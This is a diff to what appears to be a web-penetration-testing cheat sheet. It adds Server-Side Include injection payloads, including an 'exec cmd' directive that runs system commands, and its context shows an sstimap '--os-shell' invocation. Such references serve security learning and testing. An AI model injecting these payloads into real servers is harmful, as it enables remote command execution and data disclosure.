@@ -955,6 +955,15 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 
 *Arise when an application incorporates user-controllable data into response that is then parsed for Server-Side Include directives.*
 
+```
+<!--#name param1="value1" param2="value" -->
+<!--#printenv -->
+<!--#config errmsg="Error!" -->
+<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
+<!--#exec cmd="whoami" -->
+<!--#include virtual="index.html" -->
+```
+
 - eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection
 
 *Arise when an attacker can manipulate XSLT transformations performed on the server.*
